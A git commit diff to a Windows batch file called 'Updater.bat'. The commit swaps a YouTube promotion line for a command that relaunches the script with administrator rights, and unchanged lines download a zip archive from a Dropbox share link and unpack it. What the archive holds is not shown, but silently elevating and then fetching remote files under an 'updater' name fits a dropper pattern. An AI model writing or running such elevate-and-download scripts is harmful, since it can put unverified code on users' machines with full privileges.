e3f300c9781558043590519749bb688b1fde0087
REALDarianDev <73662785+REALDarianDev@users.noreply.github.com>
2021-04-17 17:21:22 -0400

    Update Updater.bat

--- Updater.bat
+++ Updater.bat
@@ -1,7 +1,8 @@
 @Echo off
 Title Welcome %USERNAME%!
 Echo Welcome %USERNAME%!
-Echo updating... Go To my youtube for more info: https://www.youtube.com/channel/UC6HGD-d9ag0uyl3dWYx4nDg
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+
 
 powershell -Command "Invoke-WebRequest https://www.dropbox.com/sh/fic6tth0cjw3jyv/AABrSD2qt4pwMNnUsxAwu_w8a?dl=1 -outfile DarianDev.zip
 powershell -command Expand-Archive -Force DarianDev.zip
